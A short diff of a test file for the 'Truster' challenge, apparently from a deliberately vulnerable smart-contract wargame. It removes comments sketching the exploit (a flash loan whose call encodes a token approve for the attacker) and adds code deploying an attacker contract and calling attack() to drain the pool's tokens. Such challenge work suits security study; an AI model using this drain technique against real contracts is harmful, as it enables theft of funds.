@@ -33,13 +33,11 @@ describe("[Challenge] Truster", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE  */
-    // flashLoan
-    // target becomes the damnValuableToken address
-    data = abi.encodeWithSignature(
-      "approve(address,uint256)",
-      "attacker address",
-      TOKENS_IN_POOL
-    );
+      const AttackerFactory = await ethers.getContractFactory('TrusterAttacker', deployer);
+      this.attacker = await AttackerFactory.deploy(this.pool.address, this.token.address);
+
+      // Drain the tokens from the contract
+      await this.attacker.connect(attacker).attack();
   });
 
   after(async function () {
